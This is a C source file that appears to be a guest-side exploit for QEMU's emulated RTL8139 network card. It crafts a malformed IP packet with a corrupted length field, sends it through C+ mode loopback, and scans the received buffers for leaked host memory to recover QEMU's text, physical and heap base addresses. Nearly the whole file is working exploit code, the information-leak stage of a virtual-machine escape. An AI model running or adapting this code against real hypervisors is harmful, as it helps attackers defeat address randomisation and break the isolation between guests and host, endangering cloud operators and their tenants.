#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <limits.h>
#include <err.h>
#include "rtl8139.h"

#define RTL8139     0xc000
#define ETH_P_IP    0x0800      /* Internet Protocol packet */

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint32_t fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

uint64_t qemu_search_text_base(void* ptr, size_t size)
{
    size_t i,j;
    uint64_t property_get_bool_offset = 0x000000000036bc9c;
    uint64_t property_get_str_offset = 0x000000000036ba43;
    uint64_t offset[]={property_get_bool_offset, property_get_str_offset};
    uint64_t *int_ptr, addr, text_base =0;
    //printf("%d\n",sizeof(offset));
    for (i=0; i<size-8; i+=8) {

        int_ptr=(uint64_t*)(ptr+i);
        addr=*int_ptr;
        //printf("%lx\n",addr);
        //scanf("%d",&j);
        for(j=0; j<sizeof(offset)/sizeof(uint64_t); j++) {
            if( ((addr & 0xfffff00000000000) == 0x500000000000)  && (( (addr - offset[j]) & 0xfff ) == 0) ) {
                text_base = addr - offset[j];
                break;
            }
            if(text_base !=0)
                break;
        }
    }
    
    return text_base;

}

uint64_t qemu_search_phy_base(void *ptr, size_t size)
{
	size_t i;
	uint64_t *int_ptr, addr, phy_base = 0;
	
	for (i = 0; i < size-8; i += 8)
	{
        int_ptr = (uint64_t*)(ptr+i);
        addr = *int_ptr;
        if((addr  & 0xfffff00000000000) == 0x700000000000)
		{
            addr = addr & 0xffffffffff000000;
            phy_base = addr - 0x80000000;
            break;
        }
    }
	
    return phy_base;
}

uint64_t qemu_search_heap_base(void *ptr, size_t size, uint64_t text_base)
{
	size_t i; 
    size_t j;
	uint64_t *int_ptr, addr, heap_base = 0;
	uint64_t target_offset[] = {0x1277b0, 0xc93e8, 0x57cd0, 0x12f0658, 0xe58f58};
	for (i = 0; i < size-8; i += 8)
	{
        int_ptr = (uint64_t*)(ptr+i);
        addr = *int_ptr;
        //printf("i: %d 0x%lx\n",i, addr);
        if((addr & 0xffff00000000) == (text_base & 0xffff00000000) && addr!=0) {
            if( (addr - text_base) >  0xd5c000) {
                for(j = 0; j < sizeof(target_offset)/sizeof(int64_t); j++) {
                    if(((addr -target_offset[j])&0xfff) == 0) {
                        heap_base = addr - target_offset[j];
                        break;
                    }
                }
            }
        }
        if(heap_base != 0)
            break;
    }
    return heap_base;
}

int cmp_page_offset(const void *a, const void *b)
{
	return page_offset(*(uint64_t *)a) - page_offset(*(uint64_t *)b);
}

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void rtl8139_writeb(uint32_t reg, uint32_t val) {
    outb(val, RTL8139 + reg);
}

void rtl8139_writew(uint32_t reg, uint32_t val) {
    outw(val, RTL8139 + reg);
}

void rtl8139_writel(uint32_t reg, uint32_t val) {
    outl(val, RTL8139 + reg);
}

uint32_t rtl8139_readw(uint32_t reg) {
    return inw(RTL8139 + reg);
}

uint32_t get_rxbufaddr() {
    return rtl8139_readw(RxBufAddr);
}

void rtl8139_cplus_transmit() {
    rtl8139_writeb(TxPoll, 1 << 6);
}

void enable_transmitter_tx_rx() {
    rtl8139_writeb(ChipCmd, CmdTxEnb | CmdRxEnb | CmdReset);
}

void enable_cp_transmitter_tx_rx() {
    rtl8139_writew(CpCmd, CPlusTxEnb | CPlusRxEnb);
}

void set_rxconfig(uint32_t val) {
    rtl8139_writel(RxConfig, val);
}

void set_txaddr(uint32_t offset, uint32_t val) {
    rtl8139_writel(TxAddr0 + 4 * offset, val);
}

void set_loopback() {
    rtl8139_writel(TxConfig, TxLoopBack);
}

/* dump packet content in xxd style */
void xxd(void *ptr, size_t size)
{
	size_t i;
	for (i = 0; i < size; i++) {
		if (i % 16 == 0) {
            printf("\n0x%016lx: ", (uint64_t)(ptr+i));
        }
		printf("%02x", *(uint8_t *)(ptr+i));
		if (i % 16 != 0 && i % 2 == 1) {
            printf(" ");
         }
    }
	printf("\n");
}

rtl8139_cplus_rx_ring * set_and_get_rxring() {
    rtl8139_cplus_rx_ring *rx_ring = (rtl8139_cplus_rx_ring *)calloc(CP_RX_BUFFER_N, sizeof(rtl8139_cplus_rx_ring));
    // rtl8139_cplus_rx_ring_desc *rx_ring_desc = (rtl8139_cplus_rx_ring_desc *)aligned_alloc(PAGE_SIZE, sizeof(rtl8139_cplus_rx_ring_desc) * CP_RX_BUFFER_N);
    rtl8139_cplus_rx_ring_desc *rx_ring_desc = (rtl8139_cplus_rx_ring_desc *)calloc(CP_RX_BUFFER_N, sizeof(rtl8139_cplus_rx_ring_desc));

    for(int i = 0; i <= CP_RX_BUFFER_N; i++) {
        rx_ring[i].cplus_rx_ring_desc = &rx_ring_desc[i];
        // rx_ring[i].buf = (void *)aligned_alloc(PAGE_SIZE, CP_RX_BUFFER_SIZE);
        rx_ring[i].buf = (void *)calloc(1, CP_RX_BUFFER_SIZE);
        uint64_t rx_ring_buf_gpa = gva_to_gpa(rx_ring[i].buf);

        rx_ring_desc[i].rxdw0 = CP_RX_OWN | (CP_RX_BUFFER_SIZE | CP_RX_BUFFER_SIZE_MASK);
        rx_ring_desc[i].rxdw1 = 0;
        rx_ring_desc[i].rxbufLO = rx_ring_buf_gpa & 0x00000000ffffffff;
        rx_ring_desc[i].rxbufHI = rx_ring_buf_gpa & 0xffffffff00000000;

        if(i == CP_RX_BUFFER_N) {
            rx_ring_desc[i].rxdw0 |= CP_RX_EOR;
        }

        
        // printf("rx_ring_desc[%d].rxdw0: %x\n", i, rx_ring_desc[i].rxdw0);
        // printf("rx_ring_desc[%d].rxbufLO: %x\n", i, rx_ring_desc[i].rxbufLO);
    }

    uint64_t rx_ring_desc_gpa = gva_to_gpa(rx_ring_desc);
    rtl8139_writel(RxRingAddrLO, rx_ring_desc_gpa & 0x00000000ffffffff);
    // rtl8139_writel(RxRingAddrHI, rx_ring_desc_gpa & 0xffffffff00000000);

    printf("rx_ring_desc_gpa:%x\n", rx_ring_desc_gpa);

    return rx_ring;
}

/* malformed ip packet with corrupted header size */
uint8_t malformed_eth_packet[]= {
    /* mac layer start */
    // mac addr 52:54:00:12:34:57, src and dst
    0x50, 0x54, 0x00, 0x12, 0x34, 0x57, 0x50, 0x54, 0x00, 0x12, 0x34, 0x57,
    // ip type
    0x08, 0x00,
    /* mac layer end */

    /* ip layer start */
    // ip version and ip header len
    0x45,
    // tos
    0x00,
    // total len
    0x00, 0x13,
    // id
    0x12, 0x17,
    // flags(3 bits) and offset(13 bits)
    0x40, 0x00,
    // TTL
    0xff,
    // tcp protocol
    0x06,
    // checksum
    0xff, 0xff,
    // src ip and dst ip
    0x7f, 0x00, 0x00, 0x01, 0x7f, 0x00, 0x00, 0x01,
    /* ip layer end */

    /* tcp layer start */
    // src port and dst port
    0x12, 0x17, 0x12, 0x17,
    // seq num
    0x12, 0x34, 0x56, 0x78,
    // ack num
    0x12, 0x34, 0x56, 0x78,
    // header len(4 bits) and resv(4 bits)
    0x50,
    // code bits
    0x10,
    // window size, checksum, urg pointer
    0x00, 0x00, 0xff, 0xff, 0x00, 0x00
};


int main() {

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        die("open pagemap failed!");
    }

    rtl8139_cplus_tx_ring_desc *cplus_tx_ring_desc = (rtl8139_cplus_tx_ring_desc *)malloc(sizeof(rtl8139_cplus_tx_ring_desc));
    
    cplus_tx_ring_desc->txdw0 = (CP_TX_OWN | CP_TX_LS | CP_TX_LGSEN | CP_TX_TCPCS) | sizeof(malformed_eth_packet);
    cplus_tx_ring_desc->txdw1 = 0;
    cplus_tx_ring_desc->txbufLO = gva_to_gpa(malformed_eth_packet);
    cplus_tx_ring_desc->txbufHI = 0;

    printf("cplus_tx_ring_desc->txdw0: 0x%x\n", cplus_tx_ring_desc->txdw0);
    printf("cplus_tx_ring_desc->txdw1: 0x%x\n", cplus_tx_ring_desc->txdw1);
    printf("cplus_tx_ring_desc->txbufLO: 0x%x\n", cplus_tx_ring_desc->txbufLO);
    printf("cplus_tx_ring_desc->txbufHI: 0x%x\n", cplus_tx_ring_desc->txbufHI);

    printf("cplus_tx_ring_desc phy addr: 0x%x\n", gva_to_gpa(cplus_tx_ring_desc));
    printf("malformed_eth_packet phy addr: 0x%x\n", gva_to_gpa(malformed_eth_packet));

    iopl(3);
    enable_transmitter_tx_rx();
    enable_cp_transmitter_tx_rx();
    set_txaddr(0, gva_to_gpa(cplus_tx_ring_desc));
    set_txaddr(1, 0);
    // rtl8139_cplus_transmit();

    set_rxconfig(AcceptAllPhys);
    set_loopback();
    
    rtl8139_cplus_rx_ring *rx_ring = set_and_get_rxring();
    rtl8139_cplus_transmit();

    sleep(2);

    FILE *fp = fopen("binary","w");
    for (int i = 0; i <= CP_RX_BUFFER_N; i++) {
        // xxd(rx_ring[i].buf, CP_RX_BUFFER_SIZE);
        write(fileno(fp), rx_ring[i].buf, CP_RX_BUFFER_SIZE);
    }

    uint64_t text_base, phy_base, heap_base;
    /* search text base */
    for (int i = 0; i <= CP_RX_BUFFER_N; i++) {
        text_base = qemu_search_text_base(rx_ring[i].buf, CP_RX_BUFFER_SIZE);
        if (text_base != 0)
            break;
    }

    if (text_base == 0)
        die("text base not found\n");
    printf("text base found: 0x%lx\n", text_base);
    /* search phy base */
    for (int i = 0; i <= CP_RX_BUFFER_N; i++) {
        phy_base = qemu_search_phy_base(rx_ring[i].buf, CP_RX_BUFFER_SIZE);
        if (phy_base != 0)
            break;
    }

    // if (phy_base == 0)
    //     die("phy base not found\n");
    // printf("physical base found: 0x%lx\n", phy_base);

    /* search heap base */
    for (int i = 0; i <= CP_RX_BUFFER_N; i++) {
        heap_base = qemu_search_heap_base(rx_ring[i].buf, CP_RX_BUFFER_SIZE, text_base);
        if (heap_base != 0)
            break;
    }

    if (heap_base == 0)
        die("heap base not found\n");
    printf("heap base found: 0x%lx\n", heap_base);

    return 0;
}